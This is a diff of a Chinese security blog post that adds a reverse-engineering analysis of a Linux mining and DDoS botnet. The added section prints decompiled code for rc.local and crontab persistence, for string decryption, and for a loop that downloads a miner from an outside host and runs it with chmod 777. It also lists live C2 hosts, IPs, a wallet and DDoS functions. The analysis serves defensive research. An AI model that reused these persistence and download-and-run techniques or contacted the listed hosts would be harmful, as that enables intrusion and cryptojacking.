@@ -33,7 +33,7 @@
 <meta property="og:description" content="360传到Alien Vault再传到我手上的三手信息，已经是晚了七天了 凑合着分析吧">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-03-28T10:51:47.000Z">
-<meta property="article:modified_time" content="2024-03-28T14:10:08.507Z">
+<meta property="article:modified_time" content="2024-03-29T12:02:51.912Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Malware">
 <meta property="article:tag" content="Reverse">
@@ -202,10 +202,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2024-03-28 18:51:47 / Modified: 22:10:08" itemprop="dateCreated datePublished" datetime="2024-03-28T18:51:47+08:00">2024-03-28</time>
+              <time title="Created: 2024-03-28 18:51:47" itemprop="dateCreated datePublished" datetime="2024-03-28T18:51:47+08:00">2024-03-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-03-29 20:02:51" itemprop="dateModified" datetime="2024-03-29T20:02:51+08:00">2024-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -290,7 +296,111 @@
 <p>截止至2024-03-28，该地址已入账比特币0.279个</p>
 <hr />
 <h1 id="botnet"><a class="markdownIt-Anchor" href="#botnet"></a> Botnet</h1>
-<p>TBC</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=65fceeb4c09f255b91b17f11">https://cert.360.cn/report/detail?id=65fceeb4c09f255b91b17f11</a></p>
+</blockquote>
+<p>在这篇报告里面有一个HFS服务</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://61.160.194.160:35130/">http://61.160.194.160:35130/</a></p>
+</blockquote>
+<p>可以下载3个文件</p>
+<ul>
+<li><code>00.sh</code> 9c45570808febe4753e79cc832ee89d8</li>
+<li><code>sss6</code> c33ffcc92a7065e3e9962448120acec4</li>
+<li><code>sss68</code> 6f7c5541b43f832b8b222bbb9cf9cd9e</li>
+</ul>
+<p>其中<code>sss6</code>是32位elf，<code>sss68</code>是64位elf</p>
+<p><code>00.sh</code>的大概活动流程如下</p>
+<ul>
+<li>删除日志</li>
+<li>Kill掉访问特定矿池的进程</li>
+<li>Kill掉监听特定端口的进程</li>
+<li>Kill掉特定名字的进程</li>
+<li>清空iptables规则并新增特定端口与矿池域名的黑名单</li>
+<li>下载并运行<code>sss6</code>和<code>sss68</code></li>
+</ul>
+<p><code>sss6</code>和<code>sss68</code>的功能基本一致，这里以<code>sss6</code>为例进行简要分析</p>
+<p>Main函数中进行的权限维持方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">v25 &#x3D; (const char *)GetmyName();</span><br><span class="line">...</span><br><span class="line">v26 &#x3D; open(&quot;&#x2F;etc&#x2F;rc.local&quot;, 2, v10);</span><br><span class="line">if ( v26 &#x3D;&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">	snprintf(v15, 1014, &quot;ehco %s start &gt;&gt;&#x2F;etc&#x2F;rc.local&quot;, v25);</span><br><span class="line">	v31 &#x3D; 0;</span><br><span class="line">	v31 &#x3D; popen(v15, &amp;unk_80EBF80);</span><br><span class="line">	pclose(v31);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	v29 &#x3D; read(v26, v14, 0x1FFF);</span><br><span class="line">	if ( v29 !&#x3D; -1 )</span><br><span class="line">	&#123;</span><br><span class="line">		v14[0x1FFF] &#x3D; 0;</span><br><span class="line">		v5 &#x3D; strlen(v14);</span><br><span class="line">		v30 &#x3D; WriteOnline(v14, v25, v5, 0);</span><br><span class="line">		if ( v30 &#x3D;&#x3D; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			v6 &#x3D; strlen(v14);</span><br><span class="line">			v30 &#x3D; WriteOnline(v14, &quot;exit 0&quot;, v6, 0);</span><br><span class="line">			if ( v30 &#x3D;&#x3D; -1 )</span><br><span class="line">			&#123;</span><br><span class="line">				lseek(v26, 0, 2);</span><br><span class="line">				snprintf(v15, 1014, &quot;\n %s start \n&quot;, v25);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				lseek(v26, v30 - 1, 0);</span><br><span class="line">				snprintf(v15, 100, &quot;\r\n %s start \r\n exit 0&quot;, v25);</span><br><span class="line">			&#125;</span><br><span class="line">			v7 &#x3D; strlen(v15);</span><br><span class="line">			write(v26, v15, v7);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	close(v26);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>ehco</code>属实有点幽默了<br />
+<code>WriteOnline</code>大概是用于在第一个参数中搜索第二个参数<br />
+<code>lseek</code>则是重新计算文件指针的位置</p>
+<p>写入<code>/etc/rc.local</code>以进行持久化，写入的命令如下所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">char *GetmyName(void)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned int v1; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">	memset(mybuf, 0, sizeof(mybuf));</span><br><span class="line">	v1 &#x3D; readlink(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, mybuf, 1024);</span><br><span class="line">	if ( v1 &gt;&#x3D; 0x400 )</span><br><span class="line">		return 0;</span><br><span class="line">	mybuf[v1] &#x3D; 0;</span><br><span class="line">	return mybuf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>另一个持久化的方法则是写入crontab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v26 &#x3D; open(&quot;&#x2F;etc&#x2F;crontab&quot;, 2, v13);</span><br><span class="line">if ( v26 !&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">	v34 &#x3D; read(v26, v28, v27 - 1);</span><br><span class="line">	if ( v34 !&#x3D; -1 )</span><br><span class="line">	&#123;</span><br><span class="line">		memset(v16, 0, sizeof(v16));</span><br><span class="line">		snprintf(v16, 256, &quot;\n*&#x2F;1   *     *     *     *     %s\n&quot;, v25);</span><br><span class="line">		*((_BYTE *)v28 + v27 - 1) &#x3D; 0;</span><br><span class="line">		if ( WriteOnline((const char *)v28, v16, v27 - 1, 0) &#x3D;&#x3D; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			lseek(v26, 0, 2);</span><br><span class="line">			v9 &#x3D; strlen(v16);</span><br><span class="line">			write(v26, v16, v9);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	close(v26);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面两段用于解除Linux资源限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v26 &#x3D; open(&quot;&#x2F;etc&#x2F;sysctl.conf&quot;, 2, v11);</span><br><span class="line">if ( v26 !&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">	v32 &#x3D; read(v26, v28, v27);</span><br><span class="line">	if ( v32 !&#x3D; -1 )</span><br><span class="line">	&#123;</span><br><span class="line">		*((_BYTE *)v28 + v27 - 1) &#x3D; 0;</span><br><span class="line">		if ( WriteOnline((const char *)v28, &quot;6553560&quot;, v27 - 1, 0) &#x3D;&#x3D; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			lseek(v26, 0, 2);</span><br><span class="line">			write(v26, &quot;\nfs.file-max&#x3D;6553560\n&quot;, 21);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">close(v26);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v26 &#x3D; open(&quot;&#x2F;etc&#x2F;security&#x2F;limits.conf&quot;, 2, v12);</span><br><span class="line">if ( v26 !&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">	v33 &#x3D; read(v26, v28, v27);</span><br><span class="line">	if ( v33 !&#x3D; -1 )</span><br><span class="line">	&#123;</span><br><span class="line">	*((_BYTE *)v28 + v27 - 1) &#x3D; 0;</span><br><span class="line">		if ( WriteOnline((const char *)v28, &quot;*   soft noproc   65535&quot;, v27 - 1, 0) &#x3D;&#x3D; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			lseek(v26, 0, 2);</span><br><span class="line">			strcpy(</span><br><span class="line">			v16,</span><br><span class="line">			&quot;\n&quot;</span><br><span class="line">			&quot;*   soft noproc   65535  \n&quot;</span><br><span class="line">			&quot;*   hard noproc   65535  \n&quot;</span><br><span class="line">			&quot;*   soft nofile   65535  \n&quot;</span><br><span class="line">			&quot;*   hard nofile   65535\n&quot;);</span><br><span class="line">			v8 &#x3D; strlen(v16);</span><br><span class="line">			write(v26, v16, v8);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	close(v26);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面则是用于解密硬编码的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EncryptData((unsigned __int8 *)byte_811B17E, 0x96u, 0x3FFu);</span><br><span class="line">EncryptData(&amp;byte_811B218, 0x100u, 0x3FFu);</span><br><span class="line">EncryptData(&amp;byte_811B318, 0x100u, 0x3FFu);</span><br><span class="line">EncryptData((unsigned __int8 *)byte_811B418, 0x100u, 0x3FFu);</span><br><span class="line">EncryptData((unsigned __int8 *)byte_811B518, 0x100u, 0x3FFu);</span><br></pre></td></tr></table></figure>
+<p>解密算法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; (0xff % 0x5f) + 88</span><br><span class="line">plain &#x3D; chr(((cipher ^ key) + key) % 256)</span><br></pre></td></tr></table></figure>
+<p>虽然传入的Key是0x3ff，但是用于接收这个参数的变量的大小是8Bit，所以会丢掉前面的0x300</p>
+<p>解密结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nishabii.xyz</span><br><span class="line">-o stratum+tcp:&#x2F;&#x2F;auto.c3pool.org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p Linuc</span><br><span class="line">-o stratum+tcp:&#x2F;&#x2F;auto.c3pool.org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p Linuc</span><br><span class="line">&#x2F;tmp&#x2F;bnVefghi</span><br><span class="line">http:&#x2F;&#x2F;hfs.t1linux.com:7845&#x2F;scdsshfk</span><br></pre></td></tr></table></figure>
+<p>函数<code>xmrMining()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">	if ( stopxmr &amp;&amp; !ProcessIsRun(s) )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( access(byte_811B418, 0) &#x3D;&#x3D; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			http_get(byte_811B518, byte_811B418);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			memset(v1, 0, sizeof(v1));</span><br><span class="line">			memset(v1, 0, sizeof(v1));</span><br><span class="line">			snprintf(v1, 1024, &quot;chmod 777 %s;%s %s -l &#x2F;tmp&#x2F;%s.txt&quot;, byte_811B418, byte_811B418, CpuMing, s);</span><br><span class="line">			system(v1);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	sleep(10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下载<code>http://hfs.t1linux.com:7845/scdsshfk</code>并写入到<code>/tmp/bnVefghi</code>然后执行以下命令</p>
+<p><code>chmod 777 /tmp/bnVefghi;/tmp/bnVefghi -o stratum+tcp://auto.c3pool.org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p Linuc -l /tmp/bnVefghi.txt</code></p>
+<p><code>42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc</code>应该就是XMR的地址了</p>
+<p>这个挖矿程序简要看了一下</p>
+<p>7c631fca21e348ae4c3408ddd400b416</p>
+<p>UPX壳</p>
+<p>脱壳之后md5是aabc159b0a4fdb1b3f4c21b9bd688210</p>
+<p>版本信息是<code>XMRig 6.20.0-C3Pool</code></p>
+<p>函数<code>Killpid()</code>则是用于Kill掉进程名包含以下字符串的进程</p>
+<ul>
+<li>Linux-</li>
+<li>xmr</li>
+<li>25000</li>
+<li>Linux2.6</li>
+<li>Linux2.7</li>
+<li>LinuxTF</li>
+<li>miner</li>
+</ul>
+<p>获取网络信息跟CPU信息懒得看了</p>
+<p>函数<code>_SendInfo</code>用于向C2发送状态信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if ( byte_811B618 !&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">	if ( strstr(CpuMing, &quot;+tcp&quot;) )</span><br><span class="line">	&#123;</span><br><span class="line">		substring(CpuMing, 47, 32, v4);</span><br><span class="line">		substring(v4, 47, 32, v4);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		strcpy(v4, &quot;Acquisition failure&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	strcpy(v4, &quot;No digging&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if ( ProcessIsRun(needle) &#x3D;&#x3D; 1 )</span><br><span class="line">	snprintf(s, 1024, &quot;CPU(Running)|%.2lf|%d%%|%.2f|%s&quot;, netuse, usage, (double)(CPUSL &#x2F; 1024.0), v4);</span><br><span class="line">else</span><br><span class="line">	snprintf(s, 1024, &quot;CPU(Stop)|%.2lf|%d%%|%.2f|%s&quot;, netuse, usage, (double)(CPUSL &#x2F; 1024.0), v4);</span><br><span class="line">v1 &#x3D; strlen(s);</span><br><span class="line">return write(MainSocket, s, v1 + 1);</span><br></pre></td></tr></table></figure>
+<p>函数<code>ServerConntectCli</code>给出C2信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int ServerConnectCli(void)</span><br><span class="line">&#123;</span><br><span class="line">	sockaddr v1; &#x2F;&#x2F; [esp+18h] [ebp-20h] BYREF</span><br><span class="line">	int v2; &#x2F;&#x2F; [esp+28h] [ebp-10h]</span><br><span class="line">	int v3; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">	v2 &#x3D; AnalysisAddress(byte_811B17E);</span><br><span class="line">	if ( !v2 )</span><br><span class="line">		return 0;</span><br><span class="line">	*(_DWORD *)&amp;v1.sa_data[6] &#x3D; 0;</span><br><span class="line">	*(_DWORD *)&amp;v1.sa_data[10] &#x3D; 0;</span><br><span class="line">	*(_WORD *)v1.sa_data &#x3D; ntohs((unsigned __int16)dword_811B214);</span><br><span class="line">	v1.sa_family &#x3D; 2;</span><br><span class="line">	*(_DWORD *)&amp;v1.sa_data[2] &#x3D; v2;</span><br><span class="line">	v3 &#x3D; socket(2);</span><br><span class="line">	if ( myconnect(v3, &amp;v1, 0x10u, 0) !&#x3D; -1 )</span><br><span class="line">		return v3;</span><br><span class="line">	close(v3);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>byte_811B17E是nishabii.xyz<br />
+dword_811B214是0x1ed7，即7895</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7895 nishabii.xyz </span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2024-03-29 [DATA EXPUNGED]</span><br><span class="line">Nmap scan report for nishabii.xyz (218.244.58.70)</span><br><span class="line">Host is up (0.022s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">7895&#x2F;tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds</span><br></pre></td></tr></table></figure>
+<p>确认C2在线</p>
+<p>函数<code>ConnectServer()</code>写了肉鸡上线时所给出的机器信息以及C2可以执行的功能</p>
+<p>IDA反编译的代码看着感觉少了几个参数，凑合着看吧</p>
+<p>肉鸡上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DecryptData((unsigned __int8 *)s, 0x198u, 0x400u);</span><br><span class="line">v13 &#x3D; 131588;</span><br><span class="line">memcpy(v14, s, sizeof(v14));</span><br><span class="line">if ( send(MainSocket) &#x3D;&#x3D; -1 )</span><br></pre></td></tr></table></figure>
+<p>接收C2命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v37 &#x3D; recv(MainSocket);</span><br></pre></td></tr></table></figure>
+<p>后面Switch的各个功能与C2命令对应</p>
+<p>DDos攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">case 4:</span><br><span class="line">	memcpy(&amp;v15[1024], &amp;v12[1], 580);</span><br><span class="line">	DealwithDDoS(&amp;v15[1024]);</span><br><span class="line">	break;</span><br></pre></td></tr></table></figure>
+<p>具体攻击类别函数如下</p>
+<ul>
+<li>SYNFlood</li>
+<li>ICMPFlood</li>
+<li>UDPFlood</li>
+<li>DK_Flood</li>
+<li>TCP_Flood</li>
+<li>Tcp</li>
+<li>WZUdp_Flood</li>
+<li>Get_CC</li>
+<li>Post_CC</li>
+<li>postattack</li>
+<li>CCAttack</li>
+<li>MNAttack</li>
+<li>HEAD</li>
+</ul>
+<p>命令下发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">case 7:</span><br><span class="line">	system(&amp;v12[1]);</span><br></pre></td></tr></table></figure>
+<p>其他功能懒得看了</p>
+<p>其他信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall EXITSIGPIPE(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class="line">&#123;</span><br><span class="line">  return printf(</span><br><span class="line">           (unsigned int)&quot;They say I&#39;m rude. I&#39;m not rude at all, but I still want to say, fuck your mother&quot;,</span><br><span class="line">           a2,</span><br><span class="line">           a3,</span><br><span class="line">           a4,</span><br><span class="line">           a5,</span><br><span class="line">           a6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">printf(</span><br><span class="line">      (unsigned int)&quot;Hi, man. I&#39;ve seen several organizations report my Trojan recently, Please let me go. I want to buy &quot;</span><br><span class="line">                    &quot;a car. That&#39;s all. I don&#39;t want to hurt others. I can&#39;t help it. My family is very poor. In China, i&quot;</span><br><span class="line">                    &quot;t&#39;s hard to buy a suite. I don&#39;t have any accommodation. I don&#39;t want to do anything illegal. Really&quot;</span><br><span class="line">                    &quot;, really, if you are interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh&quot;</span><br><span class="line">                    &quot;6v5kevp7xzngkl nutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, thank yo&quot;,</span><br><span class="line">      (unsigned int)s,</span><br><span class="line">      v4,</span><br><span class="line">      v5,</span><br><span class="line">      v6,</span><br><span class="line">      v7,</span><br><span class="line">      (char)argv);</span><br></pre></td></tr></table></figure>
+<p>典型的Chinglish</p>
+<p>EOF</p>
 
     </div>
 
